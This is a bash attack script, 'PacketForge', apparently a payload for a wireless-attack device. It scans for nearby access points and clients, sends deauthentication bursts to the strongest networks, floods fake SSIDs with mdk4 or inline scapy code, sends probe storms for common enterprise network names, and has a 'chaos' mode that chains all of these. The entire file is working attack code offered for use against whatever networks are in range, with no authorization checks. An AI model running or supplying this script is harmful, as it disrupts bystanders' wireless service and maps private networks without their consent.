#!/bin/bash
# ═══════════════════════════════════════════════════════════════════════════════
# Title:         PacketForge
# Description:   Crafts and injects custom 802.11 frames for targeted wireless
#                attacks. Supports deauth, disassoc, beacon flood, probe storms,
#                and custom frame injection with programmable patterns.
# Author:        bad-antics
# Category:      attack
# Version:       1.0
# ═══════════════════════════════════════════════════════════════════════════════

LOOT_DIR="/mmc/nullsec/PacketForge"
LOG_FILE="${LOOT_DIR}/packetforge.log"
IFACE="wlan1mon"
ATTACK_MODE="${1:-recon}"  # recon, deauth, beacon, probe, chaos

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

setup() {
    mkdir -p "$LOOT_DIR"
    log "PacketForge v1.0 initializing..."
    log "Attack mode: $ATTACK_MODE"
    log "Interface: $IFACE"

    # Verify monitor mode
    if ! iw dev "$IFACE" info 2>/dev/null | grep -q "monitor"; then
        log "WARNING: $IFACE may not be in monitor mode"
    fi

    for cmd in mdk4 aireplay-ng scapy; do
        command -v "$cmd" &>/dev/null && log "  ✓ $cmd available"
    done
}

# Recon: Map all targets before attacking
recon_mode() {
    log "=== RECON MODE ==="
    log "Scanning for targets..."

    # Quick AP scan
    timeout 15 airodump-ng "$IFACE" --write-interval 5 -w "${LOOT_DIR}/scan" --output-format csv 2>/dev/null &
    AIRO_PID=$!
    sleep 15
    kill "$AIRO_PID" 2>/dev/null

    # Parse results
    if [[ -f "${LOOT_DIR}/scan-01.csv" ]]; then
        # Extract APs
        awk -F',' '/^([0-9A-F]{2}:){5}[0-9A-F]{2}/{print $1","$4","$6","$14}' \
            "${LOOT_DIR}/scan-01.csv" 2>/dev/null | \
            sort -t',' -k3 -rn > "${LOOT_DIR}/targets_ap.csv"

        AP_COUNT=$(wc -l < "${LOOT_DIR}/targets_ap.csv")
        log "Found $AP_COUNT access points"

        # Extract clients
        awk -F',' '/^([0-9A-F]{2}:){5}[0-9A-F]{2}/&&NF<14{print $1","$6}' \
            "${LOOT_DIR}/scan-01.csv" 2>/dev/null | \
            sort -u > "${LOOT_DIR}/targets_client.csv"

        CLIENT_COUNT=$(wc -l < "${LOOT_DIR}/targets_client.csv")
        log "Found $CLIENT_COUNT clients"
    fi

    # Display target summary
    log "Target Summary:"
    head -10 "${LOOT_DIR}/targets_ap.csv" | while IFS=',' read -r bssid ch pwr ssid; do
        log "  AP: $bssid | CH: $ch | PWR: $pwr | SSID: $ssid"
    done
}

# Targeted deauth with rotation
deauth_mode() {
    log "=== DEAUTH STORM MODE ==="

    if [[ ! -f "${LOOT_DIR}/targets_ap.csv" ]]; then
        log "No targets found. Running recon first..."
        recon_mode
    fi

    # Deauth top 5 strongest APs in rotation
    head -5 "${LOOT_DIR}/targets_ap.csv" | while IFS=',' read -r bssid ch pwr ssid; do
        [[ -z "$bssid" ]] && continue
        bssid=$(echo "$bssid" | tr -d ' ')
        ch=$(echo "$ch" | tr -d ' ')

        log "Targeting: $ssid ($bssid) on CH $ch"

        # Set channel
        iwconfig "$IFACE" channel "$ch" 2>/dev/null

        # Send deauth burst (10 packets per target)
        aireplay-ng --deauth 10 -a "$bssid" "$IFACE" 2>/dev/null &

        sleep 3
    done

    wait
    log "Deauth rotation complete"
}

# Beacon flood - create phantom networks
beacon_mode() {
    log "=== BEACON FLOOD MODE ==="

    # Generate list of fake SSIDs
    FAKE_SSIDS=(
        "Free_Airport_WiFi"
        "Starbucks_WiFi_5G"
        "NETGEAR-Guest"
        "xfinity_hotspot"
        "Google_Fiber_Free"
        "FBI_Surveillance_Van_3"
        "Pretty_Fly_For_A_WiFi"
        "Drop_It_Like_Its_Hotspot"
        "LAN_of_the_Free"
        "The_Promised_LAN"
        "It_Hurts_When_IP"
        "Wu_Tang_LAN"
        "Bill_Wi_The_Science_Fi"
        "Abraham_Linksys"
        "John_Wilkes_Bluetooth"
        "Get_Your_Own_WiFi"
        "Definitely_Not_WiFi"
        "Loading..."
        "Searching..."
        "Connect_For_Free_Bitcoin"
    )

    # Write SSIDs to file for mdk4
    printf '%s\n' "${FAKE_SSIDS[@]}" > "${LOOT_DIR}/fake_ssids.txt"

    log "Flooding with ${#FAKE_SSIDS[@]} phantom networks..."

    if command -v mdk4 &>/dev/null; then
        mdk4 "$IFACE" b -f "${LOOT_DIR}/fake_ssids.txt" -s 100 2>/dev/null &
        FLOOD_PID=$!
        log "Beacon flood started (PID: $FLOOD_PID)"

        # Run for 60 seconds
        sleep 60
        kill "$FLOOD_PID" 2>/dev/null
    else
        log "mdk4 not available, using scapy fallback..."

        python3 -c "
from scapy.all import *
import random

iface = '$IFACE'
ssids = open('${LOOT_DIR}/fake_ssids.txt').read().strip().split('\n')

for i in range(500):
    ssid = random.choice(ssids)
    mac = RandMAC()
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, iface=iface, count=3, inter=0.01, verbose=0)
" 2>/dev/null
    fi

    log "Beacon flood complete"
}

# Probe storm - trigger hidden network responses
probe_mode() {
    log "=== PROBE STORM MODE ==="

    # Common enterprise SSIDs to probe
    PROBE_TARGETS=(
        "eduroam" "CORP" "INTERNAL" "SECURE" "EMP-WiFi"
        "ADMIN" "MANAGEMENT" "IT-DEPT" "GUEST" "VISITOR"
    )

    log "Probing for ${#PROBE_TARGETS[@]} common enterprise SSIDs..."

    for ssid in "${PROBE_TARGETS[@]}"; do
        python3 -c "
from scapy.all import *
mac = RandMAC()
dot11 = Dot11(type=0, subtype=4, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3='ff:ff:ff:ff:ff:ff')
probe = Dot11ProbeReq()
essid = Dot11Elt(ID='SSID', info='$ssid', len=len('$ssid'))
frame = RadioTap()/dot11/probe/essid
sendp(frame, iface='$IFACE', count=10, inter=0.05, verbose=0)
" 2>/dev/null
        log "  Probed: $ssid"
    done

    # Listen for probe responses
    log "Listening for probe responses..."
    timeout 15 tcpdump -i "$IFACE" -e 'type mgt subtype probe-resp' -c 50 2>/dev/null | \
        tee "${LOOT_DIR}/probe_responses.txt"

    RESPONSES=$(wc -l < "${LOOT_DIR}/probe_responses.txt" 2>/dev/null || echo 0)
    log "Captured $RESPONSES probe responses"
}

# Chaos mode - all attacks combined in rotation
chaos_mode() {
    log "=== CHAOS MODE === (All attacks rotating)"

    recon_mode
    sleep 2
    deauth_mode
    sleep 2
    beacon_mode
    sleep 2
    probe_mode

    log "Chaos cycle complete"
}

cleanup() {
    log "PacketForge shutting down..."
    pkill -f "mdk4.*$IFACE" 2>/dev/null
    pkill -f "aireplay.*$IFACE" 2>/dev/null
    log "Results saved to $LOOT_DIR"
}

trap cleanup EXIT

# Main - dispatch to attack mode
setup
case "$ATTACK_MODE" in
    recon)   recon_mode ;;
    deauth)  deauth_mode ;;
    beacon)  beacon_mode ;;
    probe)   probe_mode ;;
    chaos)   chaos_mode ;;
    *)       log "Unknown mode: $ATTACK_MODE"; log "Modes: recon, deauth, beacon, probe, chaos" ;;
esac
